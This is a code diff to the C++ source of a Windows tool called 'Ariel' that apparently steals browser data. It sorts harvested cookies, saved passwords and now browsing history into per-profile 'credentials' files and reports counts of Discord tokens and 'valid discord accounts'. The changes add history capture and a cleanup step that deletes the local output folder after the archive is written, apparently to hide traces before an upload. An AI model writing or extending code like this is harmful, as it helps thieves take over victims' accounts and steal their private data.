@@ -158,7 +158,9 @@ std::map<std::string, std::string> credential_files(
     const std::vector<browser::record>& records) {
     std::map<std::string, std::string> files;
     for (const auto& record : records) {
-        const std::string kind = record.type == "cookie" ? "cookies" : "passwords";
+        const bool history = record.type == "history";
+        const std::string kind = history ? "history" :
+                                 (record.type == "cookie" ? "cookies" : "passwords");
         const std::string name = "credentials/" + safe_component(record.browser) + "/" +
                                  safe_component(record.profile) + "/" + kind + ".txt";
         std::string& text = files[name];
@@ -167,9 +169,15 @@ std::map<std::string, std::string> credential_files(
             text += "profile: " + record.profile + "\n";
             text += "type: " + kind + "\n\n";
         }
-        text += "origin: " + util::printable(record.origin) + "\n";
-        text += "username: " + util::printable(record.username) + "\n";
-        text += "secret: " + util::printable(record.secret) + "\n\n";
+        if (history) {
+            text += "url: " + util::printable(record.origin) + "\n";
+            text += "title: " + util::printable(record.username) + "\n";
+            text += "details: " + util::printable(record.secret) + "\n\n";
+        } else {
+            text += "origin: " + util::printable(record.origin) + "\n";
+            text += "username: " + util::printable(record.username) + "\n";
+            text += "secret: " + util::printable(record.secret) + "\n\n";
+        }
     }
     return files;
 }
@@ -237,7 +245,7 @@ std::string summary_text(const size_t records,
                         const config::options& options) {
     std::string out = "Ariel data summary\n";
     out += "by ihateapples on github\n";
-    out += "credentials: " + std::to_string(records) + "\n";
+    out += "records: " + std::to_string(records) + "\n";
     out += "discord tokens: " + std::to_string(tokens) + "\n";
     out += "valid discord accounts: " + std::to_string(valid_accounts) + "\n";
     out += "archive password: " + std::string(options.password.empty() ? "none" : "set") + "\n";
@@ -303,6 +311,11 @@ void show_error(const config::options& options, const std::string& detail) {
     if (!options.debug) return;
     const auto text = util::from_utf8(detail);
     MessageBoxW(nullptr, text.c_str(), L"Ariel upload", MB_ICONERROR | MB_OK);
+}
+
+void cleanup_output(const config::options& options) {
+    std::error_code error;
+    util::fs::remove_all(options.output, error);
 }
 
 #if defined(_MSC_VER)
@@ -499,6 +512,7 @@ int wmain(const int argc, wchar_t** argv) {
         debug_log(options, "archive: " + error);
         show_error(options, "archive: " + error);
         pause_debug(options);
+        cleanup_output(options);
         return 2;
     }
     debug_log(options, "archive written");
@@ -557,5 +571,6 @@ int wmain(const int argc, wchar_t** argv) {
 
     debug_log(options, "done: " + util::narrow_path(archive_path));
     pause_debug(options);
+    cleanup_output(options);
     return 0;
 }
